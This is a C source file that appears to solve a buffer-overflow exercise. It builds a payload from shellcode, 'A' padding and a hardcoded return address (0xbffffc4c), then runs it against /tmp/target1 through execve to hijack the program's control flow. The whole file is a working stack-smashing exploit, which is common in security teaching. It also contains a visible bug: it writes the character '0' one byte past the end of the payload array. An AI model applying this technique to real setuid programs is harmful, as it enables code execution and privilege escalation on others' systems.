#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define LEN 264

int main(void) {
  char payload[LEN];
  for(int i=0; i<LEN; i++){
    if(i<45){
      payload[i]=shellcode[i];
    }
    else{
      payload[i]='A';
    }
  }

  payload[LEN-4]=0x4c;
  payload[LEN-3]=0xfc;
  payload[LEN-2]=0xff;
  payload[LEN-1]=0xbf;

  payload[LEN]='0';

  char *args[] = { TARGET, payload,  NULL };
  char *env[] = { NULL };


  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
